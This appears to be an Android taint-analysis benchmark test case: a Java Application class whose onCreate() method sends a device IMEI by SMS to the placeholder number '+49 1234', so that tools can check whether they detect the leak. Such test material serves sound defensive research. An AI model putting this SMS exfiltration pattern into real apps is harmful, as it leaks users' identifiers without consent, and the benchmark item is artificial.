package de.ecspride;

import android.app.Application;
import android.telephony.SmsManager;

/**
 * @testcase_name ApplicationLifecycle3
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security
 and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description A secret value is obtained when a content provider is
 initialized and leaked
 * 	when the application runs afterwards.
 * @dataflow source -> ContentProvider.onCreate() -> imei ->
 Application.onCreate() -> sink
 * @number_of_leaks 1
 * @challenges Correct handling of the Application object and the
 ContentProvider. Note that
 * 	the ContentProvider.onCreate() method is called before
 Application.onCreate() is invoked.
 */
public class ApplicationLifecyle3 extends Application {
    public static String imei;
    
    @Override
    public void onCreate() {
        super.onCreate();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, imei, null, null);
    }
    
    public ApplicationLifecyle3() { super(); }
    
    public static final String jlc$CompilerVersion$jl7 = "2.7.1";
    public static final long jlc$SourceLastModified$jl7 = 1450032968000L;
    public static final String jlc$ClassType$jl7 =
      ("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" +
       "1LaSxUT3M/GP9r9d8/j0x6IF/AWxOEfZ+BEAAA==");
}
